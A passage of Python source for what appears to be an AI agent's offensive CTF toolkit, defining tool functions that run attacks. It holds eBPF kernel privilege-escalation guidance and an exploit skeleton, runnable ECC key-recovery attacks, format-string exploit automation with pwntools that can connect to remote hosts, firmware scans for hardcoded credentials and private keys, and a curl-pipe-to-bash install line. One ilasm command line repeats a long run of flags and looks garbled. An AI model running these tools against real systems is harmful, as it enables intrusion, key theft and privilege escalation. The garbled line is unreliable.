    print("Patching .NET requires Mono.Cecil (C#) or dnlib")
    print("Install: dotnet add package Mono.Cecil")
    print("Or use: dnSpy GUI for interactive IL patching")
    print("Quick patch via sed on IL (monodis/ilasm roundtrip):")
    print(f"  monodis '{bp}' > /tmp/out.il")
    print(f"  # Edit /tmp/out.il")
    print(f"  ilasm /output:{bp}.patched.exe /dll /debug /exe /quiet /optimize /noautoinherit /fold /pack /nologo /debug /res /sse /quiet /out /quiet /noautoinherit /quiet /quiet /nologo /quiet /x64 /fold /nologo /debug /sse /res /nologo /quiet /nologo /quiet /nologo /quiet /nologo /sse /quiet /debug /fold /nologo /quiet /quiet /noautoinherit /quiet")
except Exception as ex:
    print(f"Error: {{ex}}")
"""
        return tool_execute_python(patch_code, timeout=15)

    return "Operations: decompile, list_types, list_methods, method, strings, resources, references, patch"


def tool_ebpf_exploit(operation: str = "detect", program_path: str = "",
                       vuln_type: str = "") -> str:
    """eBPF exploitation primitives.
    Ops: detect (identify eBPF vuln type), verifier_bypass (OOB r/w via verifier mistakes),
    jit_spray (JIT-compiled code injection), map_oob (map value OOB read/write),
    priv_escalation (kernel addr leak → write → LPE), skeleton (full exploit skeleton)."""

    if operation == "detect":
        code = f"""
import subprocess, re
bp = {repr(program_path)}

print("=== Kernel eBPF version check ===")
r = subprocess.run(['uname', '-r'], capture_output=True, text=True)
print(f"Kernel: {{r.stdout.strip()}}")

print("\\n=== eBPF vuln taxonomy ===")
print("  Type 1: Verifier register range bypass (speculative execution, signed/unsigned confusion)")
print("    → Off-by-one in verifier allows OOB map access")
print("    → CVE-2021-3490, CVE-2021-31440, CVE-2022-23222")
print()
print("  Type 2: Map UAF (use-after-free in map value access)")
print("    → Race condition between map update and program execution")
print()
print("  Type 3: JIT spray (inject code via BPF program compilation)")
print("    → Craft BPF instructions whose JIT output = shellcode")
print("    → Requires: ASLR bypass + execute permission on JIT pages")
print()
print("  Type 4: Privilege escalation via bpf(BPF_MAP_CREATE)")
print("    → Unprivileged BPF + weak filter = data exfil + KASLR leak")

if bp:
    print(f"\\n=== Analyzing BPF program: {{bp}} ===")
    r2 = subprocess.run(['llvm-objdump', '-d', bp], capture_output=True, text=True, timeout=10)
    if r2.returncode == 0:
        print(r2.stdout[:1000])
    else:
        r3 = subprocess.run(['readelf', '-a', bp], capture_output=True, text=True, timeout=10)
        print(r3.stdout[:500])
"""
        return tool_execute_python(code, timeout=15)

    if operation == "verifier_bypass":
        return (_shell("cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null; "
                      "cat /proc/sys/net/core/bpf_jit_harden 2>/dev/null; "
                      "cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null",
                      timeout=5) +
                "\nVerifier bypass approach:\n"
                "1. Find kernel version + CVE: check https://cve.mitre.org for BPF verifier bugs\n"
                "2. Pattern: scalar value with imprecise range → verifier thinks safe → OOB\n"
                "3. Typical primitive: BPF_MAP_TYPE_ARRAY OOB r/w → overwrite adjacent map\n"
                "4. Escalation: leak kernel pointer via OOB read → overwrite modprobe_path\n"
                "5. PoC repositories: github.com/tr3e/CVE-2021-3490, github.com/bsauce/kernel-exploit-factory\n"
                "\neSecurity check: unprivileged_bpf_disabled=0 required for most attacks")

    if operation == "skeleton":
        return (f"eBPF exploit skeleton (C):\n\n"
                f"```c\n"
                f"#include <linux/bpf.h>\n"
                f"#include <bpf/bpf.h>\n"
                f"#include <bpf/libbpf.h>\n"
                f"#include <stdio.h>\n\n"
                f"// Step 1: Create vulnerable BPF map\n"
                f"int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long), 1, 0);\n\n"
                f"// Step 2: Load vulnerable BPF program (verifier bypass)\n"
                f"// Craft instructions to confuse range tracking\n"
                f"struct bpf_insn prog[] = {{\n"
                f"    BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),\n"
                f"    // ... verifier-confusing sequence ...\n"
                f"    BPF_EXIT_INSN(),\n"
                f"}};\n\n"
                f"// Step 3: Trigger OOB r/w via map access\n"
                f"// Read kernel pointer from OOB map value\n"
                f"// Write to modprobe_path for LPE\n"
                f"```\n\n"
                f"Reference: https://github.com/bsauce/kernel-exploit-factory")

    return "Operations: detect, verifier_bypass, jit_spray, map_oob, priv_escalation, skeleton"


def tool_ecc_special_attacks(operation: str = "detect", **params) -> str:
    """ECC special attacks: Smart's attack (anomalous curves), MOV attack (supersingular),
    invalid curve, twist attack, pohlig-hellman for smooth-order curves."""

    if operation == "detect":
        p = params.get("p", 0); a = params.get("a", 0); b = params.get("b", 0)
        n = params.get("n", 0)  # curve order
        code = f"""
try:
    from sage.all import *
    p,a,b,n = {p},{a},{b},{n}
    if not (p and a and b and n):
        print("Provide p, a, b, n (curve order) to detect attack type")
        exit()
    F = GF(p)
    E = EllipticCurve(F, [a,b])
    card = E.order()
    print(f"Curve order: {{card}}")
    print(f"Provided n:  {{n}}")
    # Smart's attack: p == card
    if card == p:
        print("[!] SMART'S ATTACK APPLICABLE: #E(Fp) == p (anomalous curve)")
        print("    DLP is solvable in O(log p) time — essentially free!")
    else:
        print(f"    Smart's: card={{card}}, p={{p}} — NOT anomalous")
    # MOV attack: embedding degree
    k = 1
    q = p
    while (q-1) % card != 0 and k < 20:
        k += 1; q *= p
    print(f"    MOV embedding degree: {{k}}")
    if k <= 6:
        print(f"[!] MOV ATTACK APPLICABLE: embedding degree {{k}} is small")
        print(f"    Reduce DLP to Fp^{{k}} where standard DLP algorithms work")
    # Pohlig-Hellman: smooth order
    from sage.all import factor
    factors = factor(card)
    print(f"    Order factorization: {{factors}}")
    max_factor = max(int(f**e) for f,e in list(factors))
    if max_factor < 2**40:
        print(f"[!] POHLIG-HELLMAN APPLICABLE: largest prime factor is {{max_factor}} (< 2^40)")
    # Check for small cofactor / invalid curve potential
    cofactor = card // n if n and card % n == 0 else None
    print(f"    Cofactor h: {{cofactor}}")
    if cofactor and cofactor > 1:
        print(f"[!] SMALL COFACTOR: h={{cofactor}} — check for small-subgroup/invalid-curve")
except ImportError:
    print("SageMath required for curve analysis. Fallback analysis:")
    p,n = {p},{n}
    if p and n and p == n:
        print("[!] p == n: LIKELY SMART'S ATTACK (anomalous curve)")
    elif p and n:
        print(f"p={hex(p)}, n={hex(n)}, p==n: {p==n}")
        print("Cannot compute embedding degree without SageMath")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=30)

    if operation == "smart":
        # Smart's attack: lift to Z/pZ via p-adic logarithm
        p = params.get("p",0); a = params.get("a",0); b = params.get("b",0)
        Gx = params.get("Gx",0); Gy = params.get("Gy",0)
        Px = params.get("Px",0); Py = params.get("Py",0)
        code = f"""
try:
    from sage.all import *
    p,a,b = {p},{a},{b}
    Gx,Gy = {Gx},{Gy}
    Px,Py = {Px},{Py}
    F = GF(p)
    E = EllipticCurve(F, [a,b])
    G = E(Gx,Gy); P = E(Px,Py)
    # Smart's attack via Hensel lift to Qp
    # Lift E to Qp (p-adic numbers)
    Qp_prec = 10
    K = Qp(p, Qp_prec)
    EK = EllipticCurve(K, [K(a),K(b)])
    # Lift G and P
    def hensel_lift(pt, E_K, p):
        x,y = pt.xy()
        x_lift = E_K.base_field()(ZZ(x))
        # y^2 = x^3 + ax + b (mod p^2), solve for y lift
        rhs = x_lift**3 + E_K.a4()*x_lift + E_K.a6()
        y_lift = rhs.sqrt()
        if ZZ(y_lift) % p != ZZ(y):
            y_lift = -y_lift
        return E_K(x_lift, y_lift)
    try:
        G_lift = hensel_lift(G, EK, p)
        P_lift = hensel_lift(P, EK, p)
        pG = p * G_lift
        pP = p * P_lift
        # Log via formal group
        xpG = -pG[0]/pG[1]; xpP = -pP[0]/pP[1]
        k = (ZZ(xpP) // p) * inverse_mod(ZZ(xpG) // p, p) % p
        print(f"Smart's attack result: k = {{k}}")
        print(f"Verify: {{k}}*G == P ? {{k*G == P}}")
    except Exception as ex:
        print(f"Hensel lift failed: {{ex}}")
        print("Trying sage built-in discrete_log...")
        k = G.discrete_log(P)
        print(f"discrete_log result: k = {{k}}")
except ImportError:
    print("SageMath not available — Smart's attack requires SageMath")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "mov":
        p = params.get("p",0); a = params.get("a",0); b = params.get("b",0)
        Gx = params.get("Gx",0); Gy = params.get("Gy",0)
        Px = params.get("Px",0); Py = params.get("Py",0); k = params.get("k", 2)
        code = f"""
try:
    from sage.all import *
    p,a,b = {p},{a},{b}
    Gx,Gy,Px,Py,k = {Gx},{Gy},{Px},{Py},{k}
    F = GF(p); E = EllipticCurve(F,[a,b])
    G = E(Gx,Gy); P = E(Px,Py)
    n = G.order()
    # MOV attack: embed DLP into Fp^k via Weil/Tate pairing
    Fext = GF(p**k, 'z')
    # Use Tate pairing (available in Sage)
    try:
        eG = G.tate_pairing(G, n, k)
        eP = G.tate_pairing(P, n, k)
        print(f"Tate pairing e(G,G) = {{eG}}")
        print(f"Tate pairing e(G,P) = {{eP}}")
        # DLP in Fp^k: find l s.t. eG^l == eP
        l = eG.log(eP)
        print(f"MOV result: l = {{l}}")
        print(f"Verify: l*G == P ? {{l*G == P}}")
    except Exception as ex:
        print(f"Tate pairing error: {{ex}}")
        print("Trying discrete_log fallback...")
        l = discrete_log(eP, eG, n)
        print(f"DLP result: l = {{l}}")
except ImportError:
    print("SageMath required for MOV attack")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    if operation == "invalid_curve":
        # Invalid curve attack: server uses point without curve membership check
        p = params.get("p",0); a = params.get("a",0)
        n = params.get("n",0)  # target key bit length estimate
        code = f"""
# Invalid curve attack skeleton
# Server accepts any (x,y) as a valid curve point without checking membership
# We send points on related curves with small-order subgroups
# and use CRT to recover the private key
print("Invalid Curve Attack template:")
print()
print("1. Find low-order points on nearby curves (same p, same a, different b):")
print("   For each small prime l dividing nearby curve orders:")
print("     Find point P_l of order l on curve y^2 = x^3 + ax + b_i")
print()
print("2. Send P_l to server's scalar-mult endpoint")
print("   If server doesn't check b: d * P_l ≡ r * P_l (mod l) reveals d mod l")
print()
print("3. CRT-combine residues to recover full d")
print()
p,a = {p},{a}
if p and a:
    code = '''
from sage.all import *
p,a = ''' + str(p) + ''',''' + str(a) + '''
small_order_points = []
for b in range(1, 1000):
    try:
        E = EllipticCurve(GF(p), [a, b])
        card = E.order()
        from sage.all import factor
        for fac, exp in list(factor(card)):
            if fac < 10000:
                cofac = card // (fac**exp)
                G = cofac * E.random_point()
                if G != E(0) and fac*G == E(0):
                    print(f"b={b}, order={fac}, point=({G.xy()[0]},{G.xy()[1]})")
                    small_order_points.append((b, int(fac), int(G.xy()[0]), int(G.xy()[1])))
    except: pass
    if len(small_order_points) >= 8:
        break
print(f"Found {len(small_order_points)} small-order points")
'''
    import subprocess
    r = subprocess.run(['sage','-c', code], capture_output=True, text=True, timeout=60)
    print(r.stdout or r.stderr)
"""
        return tool_execute_python(code, timeout=90)

    if operation == "pohlig_hellman":
        p = params.get("p",0); a = params.get("a",0); b = params.get("b",0)
        Gx = params.get("Gx",0); Gy = params.get("Gy",0)
        Px = params.get("Px",0); Py = params.get("Py",0)
        code = f"""
try:
    from sage.all import *
    p,a,b = {p},{a},{b}
    Gx,Gy,Px,Py = {Gx},{Gy},{Px},{Py}
    E = EllipticCurve(GF(p),[a,b])
    G = E(Gx,Gy); P = E(Px,Py)
    n = G.order()
    print(f"Order n = {{n}}, factored: {{factor(n)}}")
    # Pohlig-Hellman via Sage
    k = G.discrete_log(P)
    print(f"DLP result: k = {{k}}")
    print(f"Verify: k*G == P ? {{k*G == P}}")
except ImportError:
    print("SageMath required")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=60)

    return ("ECC special attacks tool. Operations:\n"
            "  detect          — identify which attack applies (needs p,a,b,n)\n"
            "  smart           — Smart's attack for #E==p (needs p,a,b,Gx,Gy,Px,Py)\n"
            "  mov             — MOV/FR attack for low embedding degree (needs p,a,b,Gx,Gy,Px,Py,k)\n"
            "  invalid_curve   — generate small-order points on nearby curves (needs p,a)\n"
            "  pohlig_hellman  — smooth-order DLP via CRT (needs p,a,b,Gx,Gy,Px,Py)")


def tool_ethereum_exploit(operation: str = "analyze", contract_source: str = "",
                           contract_address: str = "", network: str = "local",
                           target_function: str = "", value_eth: str = "0") -> str:
    """Ethereum/Solidity CTF exploitation. Ops: analyze (detect vulns), reentrancy,
    integer_overflow, access_control, selfdestruct, delegatecall, flash_loan,
    storage_collision, front_run, tx_origin, setup (local hardhat/foundry env)."""

    if operation == "analyze":
        code = f"""
import re
src = {repr(contract_source)}
if not src:
    print("Provide contract_source (Solidity code)")
    print()
    print("Common Solidity vulnerability patterns to search for:")
    patterns = [
        ("Reentrancy", r'call\\.value|call{{value|transfer|send', "Use checks-effects-interactions or ReentrancyGuard"),
        ("tx.origin", r'tx\\.origin', "tx.origin auth bypass — use msg.sender"),
        ("Integer overflow", r'\\+|\\*|\\-', "SafeMath not used (Solidity < 0.8.0)"),
        ("Selfdestruct", r'selfdestruct|suicide', "Forcibly send ETH to any contract"),
        ("Delegatecall", r'delegatecall', "Storage collision, logic injection"),
        ("Uninitialized storage", r'function.*storage', "Pointer to slot 0 by default"),
        ("Weak randomness", r'block\\.number|block\\.timestamp|blockhash', "Miner-manipulable"),
        ("Access control", r'onlyOwner|require.*owner|msg\\.sender ==', "Check if properly enforced"),
        ("Flash loan", r'uniswap|flashloan|borrow', "Price manipulation via flash loans"),
    ]
    for name, pattern, desc in patterns:
        print(f"  {{name}}: {{desc}}")
else:
    print("=== Solidity Vulnerability Analysis ===")
    vulns = []
    if re.search(r'\\.call\\.value|call{{value:', src):
        # Check for reentrancy: external call before state update
        if re.search(r'call.*value.*\\n.*(?:balance|state|mapping)\\s*[-+]?=', src, re.DOTALL):
            vulns.append("REENTRANCY: external call before state update!")
        else:
            vulns.append("External ETH call found — verify checks-effects-interactions order")
    if 'tx.origin' in src:
        vulns.append("tx.origin: Authentication bypassed if user is contract")
    if re.search(r'block\\.(timestamp|number|difficulty|blockhash)', src):
        vulns.append("Weak randomness: block properties predictable by miners")
    if 'selfdestruct' in src or 'suicide(' in src:
        vulns.append("selfdestruct present — can force ETH into contract, break assumptions")
    if 'delegatecall' in src:
        vulns.append("delegatecall: storage collision possible if proxy pattern")
    # Check for SafeMath (Solidity < 0.8)
    if not re.search(r'pragma solidity \\^0\\.[89]\\.|using SafeMath', src):
        vulns.append("No SafeMath + old Solidity version: integer overflow/underflow risk")
    if 'mapping' in src and re.search(r'function.*public.*payable', src):
        if not re.search(r'require.*msg\\.sender|onlyOwner|modifier', src):
            vulns.append("Unprotected public payable function — anyone can call")
    for v in vulns:
        print(f"[!] {{v}}")
    if not vulns:
        print("No obvious vulnerabilities detected. Manual review recommended.")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "reentrancy":
        return f"[reentrancy] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "selfdestruct":
        return f"[selfdestruct] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "delegatecall":
        return f"[delegatecall] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "tx_origin":
        return f"[tx_origin] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "setup":
        return (_shell("which foundry 2>/dev/null || which forge 2>/dev/null; "
                      "which hardhat 2>/dev/null; which anvil 2>/dev/null", timeout=5) +
                "\nFoundry setup:\n"
                "  curl -L https://foundry.paradigm.xyz | bash\n"
                "  foundryup\n"
                "  forge init exploit_ctf && cd exploit_ctf\n\n"
                "Quick exploit template:\n"
                "  // test/Exploit.t.sol\n"
                "  pragma solidity ^0.8.13;\n"
                "  import 'forge-std/Test.sol';\n"
                "  import '../src/Target.sol';\n\n"
                "  contract ExploitTest is Test {\n"
                "    Target target;\n"
                "    function setUp() public { target = new Target{value: 10 ether}(); }\n"
                "    function test_exploit() public {\n"
                "      // your exploit here\n"
                "      assertEq(target.isSolved(), true);\n"
                "    }\n"
                "  }\n"
                "  forge test -vvvv")

    if operation == "flash_loan":
        return f"[flash_loan] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "storage_collision":
        return f"[storage_collision] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return ("Ethereum exploit operations:\n"
            "  analyze          — detect vulnerabilities in Solidity source\n"
            "  reentrancy       — cross-function/read-only reentrancy attack\n"
            "  selfdestruct     — force ETH send to break balance assumptions\n"
            "  delegatecall     — storage collision via proxy pattern\n"
            "  tx_origin        — tx.origin auth bypass\n"
            "  flash_loan       — price manipulation via flash loan\n"
            "  storage_collision— slot layout / uninitialized pointer exploit\n"
            "  setup            — Foundry/Hardhat environment setup\n"
            "  integer_overflow — SafeMath bypass (Solidity < 0.8)\n"
            "  access_control   — unprotected function exploitation")


def tool_firmware_unpack(firmware_path: str, operation: str = "analyze",
                          arch: str = "auto", output_dir: str = "") -> str:
    """Firmware analysis: analyze (binwalk + file type), extract (filesystem extraction),
    emulate (QEMU user/system mode), find_vulns (hardcoded creds, command injection, overflow),
    strings_scan (secrets, URLs, keys), entropy (packed/encrypted regions)."""

    fp = _w2l(firmware_path) if (IS_WINDOWS and USE_WSL) else firmware_path
    out = output_dir or f"/tmp/firmware_extract_{int(time.time())}"

    if operation == "analyze":
        return _shell(f"binwalk '{fp}' 2>&1; echo '---'; "
                     f"file '{fp}'; echo '---'; "
                     f"xxd '{fp}' | head -20; echo '---'; "
                     f"strings '{fp}' | grep -E 'http://|https://|password|admin|root|flag' | head -20",
                     timeout=30)

    if operation == "extract":
        result = _shell(f"binwalk -eM --run-as=root '{fp}' -C '{out}' 2>&1 | tail -20 && "
                       f"echo '--- Extracted contents ---' && "
                       f"find '{out}' -type f | head -50", timeout=120)
        if not result.strip() or "error" in result.lower():
            result += _shell(f"mkdir -p '{out}' && "
                            f"jefferson '{fp}' -d '{out}' 2>&1 || "  # JFFS2
                            f"ubireader_extract_images '{fp}' -o '{out}' 2>&1 || "  # UBI
                            f"7z x '{fp}' -o'{out}' 2>&1 | tail -10", timeout=60)
        return result

    if operation == "emulate":
        # Try QEMU user mode for common architectures
        code = f"""
import subprocess, os
fp = {repr(fp)}
arch = {repr(arch)}
# Detect arch from file magic
r = subprocess.run(['file', fp], capture_output=True, text=True)
arch_info = r.stdout
print(f"File type: {{arch_info.strip()}}")
# Determine QEMU binary
qemu_map = {{
    'ARM':    'qemu-arm-static',
    'MIPS':   'qemu-mips-static',
    'MIPSEL': 'qemu-mipsel-static',
    'PowerPC':'qemu-ppc-static',
    'x86-64': 'qemu-x86_64',
    'x86':    'qemu-i386',
    'AArch64':'qemu-aarch64-static',
}}
detected = 'x86-64'
for a, q in qemu_map.items():
    if a in arch_info:
        detected = a; break
print(f"Detected arch: {{detected}}")
qemu_bin = qemu_map.get(detected, 'qemu-arm-static')
r2 = subprocess.run(['which', qemu_bin], capture_output=True, text=True)
if r2.returncode != 0:
    print(f"{{qemu_bin}} not found. Install: apt install qemu-user-static")
    print("Alternative: extract filesystem and use chroot:")
    print(f"  binwalk -eM '{fp}' -C /tmp/fw")
    print(f"  chroot /tmp/fw /bin/sh")
else:
    # Run binary with QEMU
    r3 = subprocess.run([qemu_bin, fp], capture_output=True, text=True, timeout=5,
                         env={{**os.environ, 'QEMU_LD_PREFIX': '/tmp/fw'}})
    print(f"QEMU output: {{r3.stdout[:500]}} {{r3.stderr[:200]}}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "find_vulns":
        extracted = out if os.path.exists(out) else f"/tmp/_binwalk.extracted"
        code = f"""
import subprocess, os, re
extracted = {repr(extracted)}
print("=== Hardcoded credentials ===")
r = subprocess.run(["grep", "-r", "-iE",
    "password|passwd|secret|admin|root|default.*pass|hardcoded",
    extracted, "--include=*.conf", "--include=*.cfg",
    "--include=*.ini", "--include=*.sh", "--include=*.py"],
    capture_output=True, text=True, timeout=20)
for line in r.stdout.split('\\n')[:20]: print(line)
print()
print("=== Command injection sinks ===")
r2 = subprocess.run(["grep", "-r", "-E",
    "system\\(|popen\\(|exec\\(|shell_exec\\(|backtick|`.*\\$",
    extracted, "--include=*.c", "--include=*.php", "--include=*.cgi"],
    capture_output=True, text=True, timeout=20)
for line in r2.stdout.split('\\n')[:15]: print(line)
print()
print("=== Interesting binaries ===")
r3 = subprocess.run(["find", extracted, "-type", "f", "-executable"],
    capture_output=True, text=True, timeout=10)
for f in r3.stdout.strip().split('\\n')[:20]:
    if f: print(f)
print()
print("=== Crypto keys / certificates ===")
r4 = subprocess.run(["grep", "-r", "-lE",
    "BEGIN PRIVATE KEY|BEGIN RSA|BEGIN CERTIFICATE|BEGIN EC",
    extracted], capture_output=True, text=True, timeout=15)
for line in r4.stdout.split('\\n')[:10]: print(line)
"""
        return tool_execute_python(code, timeout=40)

    if operation == "strings_scan":
        return _shell(f"strings '{fp}' | grep -iE "
                     f"'password|passwd|secret|api.key|token|flag|admin|root|https?://' | head -50 && "
                     f"echo '---WiFi/creds---' && "
                     f"strings '{fp}' | grep -iE 'ssid|wpa|wep|wifi|802\\.11' | head -20",
                     timeout=20)

    if operation == "entropy":
        return _shell(f"binwalk -E '{fp}' 2>&1 | head -30", timeout=20)

    return "Operations: analyze, extract, emulate, find_vulns, strings_scan, entropy"


def tool_flutter_re(apk_path: str = "", binary_path: str = "",
                     operation: str = "detect") -> str:
    """Flutter/React Native/Dart reverse engineering.
    Ops: detect (identify framework + version), flutter_extract (extract libflutter.so + libapp.so),
    dart_snapshot (analyze Dart AOT snapshot), rn_bundle (extract React Native JS bundle),
    rn_deobfuscate (deobfuscate hermes bytecode), strings (framework-specific string extraction)."""

    sp = (_w2l(apk_path) if (IS_WINDOWS and USE_WSL) else apk_path) if apk_path else ""
    bp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""
    work = f"/tmp/flutter_re_{int(time.time())}"

    if operation == "detect":
        code = f"""
import subprocess, os, zipfile
target = {repr(sp or bp)}
if not target: print("Provide apk_path or binary_path"); exit()

print("=== Framework detection ===")
# Check for Flutter
if target.endswith('.apk') or target.endswith('.ipa'):
    try:
        with zipfile.ZipFile(target) as z:
            files = z.namelist()
            if any('libflutter.so' in f for f in files):
                print("[!] Flutter app detected (libflutter.so present)")
                flutter_so = [f for f in files if 'libflutter.so' in f]
                print(f"  Flutter libs: {{flutter_so}}")
            if any('libapp.so' in f for f in files):
                print("[!] Dart AOT snapshot (libapp.so)")
            if any('index.android.bundle' in f or 'main.jsbundle' in f for f in files):
                print("[!] React Native app (JS bundle present)")
                rn_files = [f for f in files if 'bundle' in f.lower() or 'jsbundle' in f.lower()]
                print(f"  RN bundles: {{rn_files}}")
            if any('assets/flutter_assets' in f for f in files):
                print("[!] Flutter assets directory")
    except Exception as ex:
        print(f"Error: {{ex}}")
else:
    r = subprocess.run(['strings', target], capture_output=True, text=True, timeout=15)
    s = r.stdout
    if 'flutter' in s.lower(): print("[!] Flutter strings found")
    if 'dart:' in s: print("[!] Dart runtime strings found")
    if 'ReactNative' in s or 'hermes' in s.lower(): print("[!] React Native/Hermes found")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "flutter_extract":
        _shell(f"mkdir -p '{work}'")
        return _shell(f"unzip -j '{sp}' 'lib/*/libflutter.so' 'lib/*/libapp.so' "
                     f"'assets/flutter_assets/*' -d '{work}' 2>/dev/null && "
                     f"ls -la '{work}' && "
                     f"echo '--- libapp.so strings ---' && "
                     f"strings '{work}/libapp.so' 2>/dev/null | grep -iE 'flag|ctf|key|secret|check' | head -20",
                     timeout=30)

    if operation == "dart_snapshot":
        return (_shell(f"strings '{bp or work+'/libapp.so'}' | "
                      f"grep -vE '^[\\x00-\\x1f]|^\\s*$' | head -60",
                      timeout=15) +
                "\nDart AOT snapshot analysis:\n"
                "  Tool: https://github.com/mildsunrise/darter (Dart snapshot parser)\n"
                "  Tool: https://github.com/Impact-I/reFlutter (patching libflutter for SSL bypass)\n"
                "  reFlutter: reflutter --arch arm64 target.apk → patches snapshot for Burp proxy\n"
                "  IDA/Ghidra: load libapp.so, look for _kDartIsolateSnapshotInstructions symbol")

    if operation == "rn_bundle":
        _shell(f"mkdir -p '{work}'")
        return _shell(f"unzip -j '{sp}' '*.bundle' '*.jsbundle' 'assets/index*' -d '{work}' 2>/dev/null && "
                     f"ls '{work}' && "
                     f"cat '{work}'/*.bundle 2>/dev/null | head -200 || "
                     f"cat '{work}'/*.jsbundle 2>/dev/null | head -200",
                     timeout=20)

    if operation == "rn_deobfuscate":
        bundle = bp or f"{work}/index.android.bundle"
        code = f"""
import subprocess, re, os
bundle = {repr(bundle)}
if not os.path.exists(bundle):
    print(f"Bundle not found: {{bundle}}")
    print("Extract first with operation='rn_bundle'")
    exit()

with open(bundle, 'rb') as f: data = f.read()

# Check for Hermes bytecode
if data[:4] == b'Her\\x00' or data[:4] == b'Her\\xc0':
    print("[!] Hermes bytecode detected")
    r = subprocess.run(['hbcdump', bundle], capture_output=True, text=True, timeout=30)
    if r.returncode == 0:
        print(r.stdout[:2000])
    else:
        print("hbcdump not found. Install: npm install -g hermes-dec")
        r2 = subprocess.run(['hermes-dec', bundle], capture_output=True, text=True, timeout=30)
        print(r2.stdout[:2000] if r2.returncode==0 else "hermes-dec also not found")
else:
    # Plain JS - look for interesting content
    text = data.decode(errors='replace')
    # Find API endpoints
    apis = re.findall(r'https?://[^"\'\\s{{}}]{5,100}', text)
    print(f"API endpoints: {{set(apis)}}")
    # Find flag patterns
    flags = re.findall(r'(?:flag|ctf|key|secret|token)[^"\'{{}}\\n]{{0,50}}', text, re.IGNORECASE)
    for f in flags[:10]: print(f"  {{f[:100]}}")
"""
        return tool_execute_python(code, timeout=30)

    return "Operations: detect, flutter_extract, dart_snapshot, rn_bundle, rn_deobfuscate, strings"


def tool_format_string_exploit(binary_path: str, host: str = "", port: int = 0,
                                operation: str = "find_offset",
                                write_addr: str = "", write_val: str = "",
                                offset: int = 0, extra_args: str = "") -> str:
    """Pwntools-backed format string exploit helper.
    Ops: find_offset (send %p chains to find AAAA offset),
    read_stack (dump stack with %p chain up to depth 30),
    write_target (generate fmtstr_payload for GOT overwrite),
    auto_exploit (FmtStr full automation against local or remote)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""

    def _conn_code():
        if host and port:
            return f"io = remote({repr(host)}, {port})"
        elif sp:
            return f"io = process({repr(sp)})"
        else:
            return "# no binary or host provided"

    if operation == "find_offset":
        code = f"""
from pwn import *
context.log_level = 'error'
{_conn_code()}
for i in range(1, 35):
    payload = (b'AAAA.%' + str(i).encode() + b'$p.') 
    io2 = process({repr(sp)}) if {repr(sp)} else remote({repr(host or 'localhost')}, {port or 9999})
    try:
        io2.sendline(payload)
        out = io2.recvall(timeout=2)
        if b'0x41414141' in out or b'41414141' in out.lower():
            print(f'[FOUND] offset = {{i}}  (saw 0x41414141 in response)')
            print(f'  response: {{out[:120]}}')
            io2.close()
            break
        io2.close()
    except Exception as ex:
        try: io2.close()
        except: pass
        print(f'offset {{i}}: error {{ex}}')
"""
        return tool_execute_python(code, timeout=60)

    if operation == "read_stack":
        depth = offset or 20
        code = f"""
from pwn import *
context.log_level = 'error'
{_conn_code()}
payload = '.'.join([f'%{{i}}$p' for i in range(1, {depth+1})]).encode()
try:
    io.sendline(payload)
    out = io.recvall(timeout=3)
    print(f'Stack dump (offsets 1-{depth}):')
    parts = out.split(b'.')
    for i, p in enumerate(parts[:{depth}], 1):
        try:
            v = int(p.strip(), 16)
            asc = bytes.fromhex(f'{{v:08x}}')[::-1].decode(errors='replace').replace('\\n','.')
            print(f'  [{{i:2d}}] {{p.strip().decode():<18}} | {{asc}}')
        except:
            print(f'  [{{i:2d}}] {{p.strip().decode()[:20]}}')
except Exception as ex:
    print(f'Error: {{ex}}')
finally:
    try: io.close()
    except: pass
"""
        return tool_execute_python(code, timeout=30)

    if operation == "write_target":
        if not write_addr or not write_val or not offset:
            return "Requires write_addr (hex), write_val (hex), and offset (int)"
        code = f"""
from pwn import *
context.arch = 'amd64'
addr = {int(write_addr, 16) if write_addr.startswith('0x') else int(write_addr, 16)}
val  = {int(write_val, 16)  if write_val.startswith('0x')  else int(write_val, 16)}
off  = {offset}
payload = fmtstr_payload(off, {{addr: val}})
print(f'Payload length: {{len(payload)}}')
print(f'Payload hex:    {{payload.hex()}}')
print(f'Payload repr:   {{repr(payload)}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "auto_exploit":
        if not offset:
            return "Provide offset= (from find_offset op)"
        code = f"""
from pwn import *
context.log_level = 'warning'
{_conn_code()}

def exec_fmt(payload):
    global io
    try: io.close()
    except: pass
    {'io = remote(repr(host), port)' if host and port else f'io = process(repr(sp))' if sp else ''}
    io.sendline(payload)
    return io.recvall(timeout=2)

fmt = FmtStr(exec_fmt, offset={offset})
print(f'[FmtStr] auto-detected offset: {{fmt.offset}}')
print('Use fmt.write(addr, val) then fmt.execute_writes() for arbitrary writes')
"""
        return tool_execute_python(code, timeout=60)

    return "Operations: find_offset, read_stack, write_target, auto_exploit"


def tool_fsop(binary_path: str = "", operation: str = "detect",
               libc_path: str = "", target_func: str = "system",
               rip_control: str = "0") -> str:
    """IO_FILE / FSOP (File Stream Oriented Programming) for glibc ≥2.35 where __free_hook is gone.
    Ops: detect (check if FSOP applicable), fake_file (build fake _IO_FILE struct),
    _io_list_all (overwrite _IO_list_all for arbitrary vtable), wide_data (wide_data attack for rip),
    skeleton (full pwntools exploit skeleton)."""

    # IO_FILE_OFFSETS: _flags=0x0, _IO_write_base=0x20, _IO_write_ptr=0x28, vtable=0xd8, _wide_data=0xa0

